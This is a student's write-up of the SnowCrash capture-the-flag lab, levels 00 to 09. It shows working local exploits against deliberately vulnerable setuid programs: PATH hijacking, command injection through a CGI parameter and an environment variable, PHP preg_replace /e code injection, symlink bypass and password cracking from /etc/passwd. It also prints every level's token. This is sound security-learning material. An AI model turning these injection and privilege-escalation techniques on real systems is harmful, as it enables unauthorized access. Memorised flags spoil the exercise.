# **snow-crash**
### an introduction to the wonderful world of ✨cybersecurity✨

### level00 :
ok so, first of, what do we have to work with ?

```sh
level00@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level00 level00  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-xr-x---+ 1 level00 level00  220 Apr  3  2012 .bash_logout
-r-xr-x---+ 1 level00 level00 3518 Aug 30  2015 .bashrc
-r-xr-x---+ 1 level00 level00  675 Apr  3  2012 .profile
```
so, we don't have much to work with, at least here !
Let's try to aim directly for the flag.
When running the following command : `ls -lR / 2>/dev/null | grep flag00`
we get :
```sh
----r--r-- 1 flag00  flag00      15 Mar  5  2016 john
----r--r--  1 flag00  flag00      15 Mar  5  2016 john
```
Alright, well, that was easy enough ! now let's see if we can read it.
```sh
$> whereis john
john: /usr/sbin/john
```
```sh
cat /usr/sbin/john
cdiiddwpgswtgt
```
here it is ! we have just found the flag !
We aren't done yet though, if we try this password we get an incorrect password, subsequently, let's decrypt it.
Using Dcode's cipher recognition tool with the keyword **john**, we are prompted with:
`nottoohardhere`
using the affine-cipher method.
Now that you have inputed the password and recuperated the following token with the **getflag** function let's keep going :
`x24ti5gi3x0ol2eh4esiuxias`

# level01 :
Let's repeat what we have done just before.
using **ls** we can't find anything.
Let's check */etc/passwd* just in case our user was a bit lazy...
```sh
level01@SnowCrash:~$ cat /etc/passwd
[...]
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
[...]
```
Here we go. now as you can guess this one seems encrypted as well, Dcode here we come.
Aaaaaaaaaaaaaaaaaaaaaaaaaaaaand **NOTHING**...
ok well let's look up how the keyword john might just help.
After a quick google search we find `John The Ripper` a password cracking software. niiiiiiice.
Now having taken 95 minutes to install and comprehend `John` we get :
`abcdefg`
and well, that was useless.
`f2av5il02puano7naaf6adaaf`

# level02 :
```sh
level02@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level02 level02  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level02 level02  220 Apr  3  2012 .bash_logout
-r-x------ 1 level02 level02 3518 Aug 30  2015 .bashrc
----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
-r-x------ 1 level02 level02  675 Apr  3  2012 .profile
```
here we go A FILE !
so what of it, what's a pcap ? Well, a pcap is an interface for capturing network traffic, basically a file that logs data sent through a network.
The most logical way to read it (to me) is through **wireshark** so let's do it.
First of, we need the file, file which is located in our VM that does not have wireshark installed and where we have no rights to install it.
let's use **SCP**
SCP allows me to copy a file securely through an ssh connection so you are going to need your level02 token.
Ok now we have the file let's see that.
![](./.img/wshk.png)
This kind of looks like incomprehensible gibberish but we don't need to understand everything that is going on.
What matters is the data, you just have to click on any packet and look if it has a subsection **Data** under **Transmission Control Protocol**.
if it does, you will be able to read what was sent to you.
After a bit of scrolling we can see that we have received a **login** and a **password** but we only want the password so let's focus on that.
after reading every bytes of data sent after the **password** prompt we get :
`f t _ w a n d r · · · N D R e l · L 0 L · ···`
There are still a few bytes of data afterwards but after a while I understood that receiving `···` meant the end of line.
So let's input the password yeah ?
Again, that doesn't work. So what's the gist ?
Well it turns out the **·** character means **backspace**, giving us the following password :
`ft_waNDReL0L`
(don't ask me why but it seems the last *backspace* does not work as one).
And right after inputing the password and launching getflag I get my token !
`kooda2puivaav1idi4f57q8iq`

# level03 :
```sh
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
```
A file again, and an executable.
This is where it gets tricky.
First let's execute it.
```sh
level03@SnowCrash:~$ ./level03 | cat -e
Exploit me$
```
Hmmm this isn't exactly helpful, and that means we're going to dive in the wonderous world of ***disassembly***...
What disassembling does is translating machine language into assembly language. A very useful **reverse-engineering** tool.
I'll save you the trouble of looking for hours on end how to disassemble an executable properly. So here is what I ended up doing.
First I disassemble level03 with ltrace and I get this :
```sh
level03@SnowCrash:~$ ltrace ./level03 
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                        = 2003
geteuid()                                        = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```
Do you see it ? Our ticket to level04. Laying inches from our fingers...
`system("/usr/bin/env echo Exploit me"Exploit me`
What we see here is the fact that they are using the built-in function `echo`.
You might be wondering just why that's interesting ? Well see, what tells your computer where echo is defined is the `PATH` variable. A variable you can define **YOURSELF**.
The only thing you'll need to do is add /tmp to your **ENV** with the following line :
```sh
export PATH=/tmp:$PATH
```
Now that you have you very own folder in the PATH you'll need to make echo execute getflag.
There are quite a few ways to go at it such as making echo a symlink of getflag or copying getflag into echo, however I find the simplest answer is often the best so i'll just open my file with nano (or vim) and write **getfile** in the echo file.
Then simply give the appropriate rights to your echo file and you should be good to go.
```sh
chmod 777 /tmp/echo
```
You can now execute **./level03** and get your token :
`qi0maab88jeaj46qoumi7maus`

# level04 :
```sh
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```
This time we are given a perl script. First off let's read it.
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
After a bit of digging (if like me you've never used perl) this opens a webpage on **localhost:4747** where the subroutine **x** is executed.
This one is pretty straightforward simply modify the parameter of x (which is also x for some reason) in order to print the result of the getflag function.
To do that simply curl the website using the following commad :
```sh
curl '127.0.0.1:4747?x=$(getflag)'
```
OHHHH MAGIC :
``ne2searoevaevoem4ov4ar8ap``
Et voila, on to level05.

# level05 :
```sh
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```
Again not much to see here, we then run the usual command to see if any file belongs to the flagXX.
```sh
level05@SnowCrash:~$ ls -lR / 2>/dev/null | grep flag05
-rwxr-x--- 1 flag05  flag05      94 Mar  5  2016 openarenaserver
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
```
So, 2 files here let's see :
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
What this file does is quite simple, it executes every file in /opt/openarenaserver and then deletes them, and since it is a file owned by flag05 it can execute getflag. let's try the basic.

```sh
nano/tmp/getflag
```
```sh
getflag
```
now we make a symlink of the file opt/openarenaserver. (the symlink is not mandatory I just don't want to rewrite my file if it fails)
```sh
level05@SnowCrash:~$ cd /opt/openarenaserver/
level05@SnowCrash:/opt/openarenaserver$ ln -s /tmp/getflag test
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root    root    60 Jun 29 14:10 .
drwxr-xr-x  1 root    root    60 Jun 29 13:35 ..
lrwxrwxrwx  1 level05 level05 12 Jun 29 14:10 test -> /tmp/getflag
```
now we go execute the binary.
```sh
level05@SnowCrash:/opt/openarenaserver$ cd /usr/sbin/
level05@SnowCrash:/usr/sbin$ bash openarenaserver 
+ getflag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
level05@SnowCrash:/usr/sbin$
```
So, why doesn't it work ?
Well the user who created the file is me, I can't execute getflag thus I get an error.
Let's try something else.
```sh
echo "getflag > /tmp/flag" > /opt/openarenaserve/getflag.sh
```
Basically we cause flag05 to create a file which then can execute getflag. Let's see :
```sh
level05@SnowCrash:/usr/sbin$ bash openarenaserver 
+ echo 'getflag > /tmp/flag'
level05@SnowCrash:/usr/sbin$ ls -la /opt/openarenaserver
total 4
drwxrwxr-x+ 2 root    root    60 Jun 29 14:18 .
drwxr-xr-x  1 root    root    60 Jun 29 13:35 ..
-rw-rw-r--+ 1 level05 level05 20 Jun 29 14:18 getflag.sh
level05@SnowCrash:/usr/sbin$ bash openarenaserver 
+ getflag
level05@SnowCrash:/usr/sbin$ cat /tmp/flag
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
It doesn't work, luckily while doing tests I got to see my script execute itself, probably a crontab.
If we can't execute it let it do so itself.

We do the same but now we wait...
```sh
level05@SnowCrash:~$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Jun 29 14:24 .
drwxr-xr-x  1 root root 60 Jun 29 13:35 ..
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
HERE WE GO EN FAIT.

# Level06 :

```sh
level06@SnowCrash:~$ ls -la
total 12
-rwsr-x---+ 1 flag06 level06 7503 Mar  5  2016 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
-r-xr-x---  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-xr-x---  1 level06 level06 3518 Aug 30  2015 .bashrc
-r-xr-x---  1 level06 level06  675 Apr  3  2012 .profile
```

We’ve got two files:

- A **setuid binary** (`level06`) owned by `flag06`
- A **PHP script** (`level06.php`) that's likely used by the binary

Let’s run them without args and see:

```sh
level06@SnowCrash:~$ ./level06
PHP Warning: file_get_contents(): Filename cannot be empty in level06.php on line 4
```

Same warning if we run `./level06.php`, so the compiled `level06` likely invokes the PHP script.

---


```php
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y("\2")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

What’s happening:

1. `x($file, ...)` reads file contents with `file_get_contents`.
2. It applies `preg_replace(.../e...)` to evaluate `[x ...]` blocks.
3. `[x payload]` triggers execution of `y("payload")`, but due to the `/e` flag, the payload is run as PHP code.
4. Then `[` and `]` are turned into `(` and `)`.
5. The script prints the result.

---

This is classic PHP command injection—thanks to the deprecated `/e` modifier!  
We can embed shell commands inside `[x ...]` and they get evaluated by PHP:

```sh
echo '[x ${`getflag`}]' > /tmp/getflag06
```

Then run:

```sh
./level06 /tmp/getflag06
```

Sample output:

```sh
PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in level06.php(4) : regexp code on line 1
```

And there it is, the password for the next level:  
**`wiok45aaoguiboiki2tuin6ub`**

# Level07 :

```sh
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
level07@SnowCrash:~$ ./level07 
level07
```
Okay so let's ltrace that :
```sh
level07@SnowCrash:~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                        = 2007
geteuid()                                        = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME")                                = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++
```
Perfect it's super easy, it gets the value of logname and then prints it.

Let's try this :
```sh
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
```
then we execute level7 :
```sh
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
yeaaaaaaaah.

# Level08 :

```sh
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
```sh
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
Fine they don't want to print token let's print it's symlink then :

```sh
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/link
level08@SnowCrash:~$ ./level08 /tmp/link
quif5eloekouj29ke0vouxean
```
apparently it's just the password to flag08 so don't forget getflag.
```sh
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

# Level09 :

```sh
level09@SnowCrash:~$ ls
level09  token
level09@SnowCrash:~$ ./level09 
You need to provied only one arg.
level09@SnowCrash:~$ ./level09 aaaaa
abcde
```
We have a program that prints characters and adds the value of their position in the string to the ascii value of the character.

```sh
level09@SnowCrash:~$ ./level09 $(cat token)
f5mpq;v�E��{�{��TS�W�����
```
okay we might need a little program for that.
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char* test(char* s) {
  int i = -1;
  char* newstr;
  newstr = malloc(sizeof(char) * strlen(s));
  while (s[++i])
    newstr[i] = s[i] - i;
  return newstr;
}

int main(int ac, char **av) {
  if (ac != 2)
    exit(1);
  char* res = test(av[1]);
  printf("%s", res);
  free(res);
  return 0;
}
```
it's terrible code but that's not a problem. After using scp to copy token we read it and we get :
```sh
maparigi in ~/Documents/42/outer_circle/cyber/snow_crash on main λ ./resources/Level09/rev $(cat ./resources/Level09/token)
f3iji1ju5yuevaus41q1afiuq%
```
```sh
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
```

# Level10